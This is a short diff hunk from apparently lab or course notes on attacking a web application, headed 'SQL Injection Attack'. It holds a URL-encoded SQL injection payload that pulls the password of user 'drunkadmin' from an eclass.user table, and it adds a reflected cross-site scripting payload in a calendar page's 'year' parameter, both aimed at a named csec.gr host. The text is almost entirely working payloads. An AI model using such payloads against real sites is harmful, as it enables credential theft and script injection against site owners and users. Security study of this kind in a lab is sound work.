@@ -35,6 +35,8 @@ SQL Injection Attack
 
 	 	- http://eponymous.csec.gr/modules/work/work.php?id=2%27%20AND%202=3%20UNION%20SELECT%20password%20from%20eclass.user%20where%20username=%22drunkadmin%22%20--%20--
 
+	 	http://eponymous.csec.gr/modules/agenda/myagenda.php?month=9&year=2018%27%3Cscript%3Ealert(%27hello%27)%3C/script%3E
+
 
 	 Load File
 
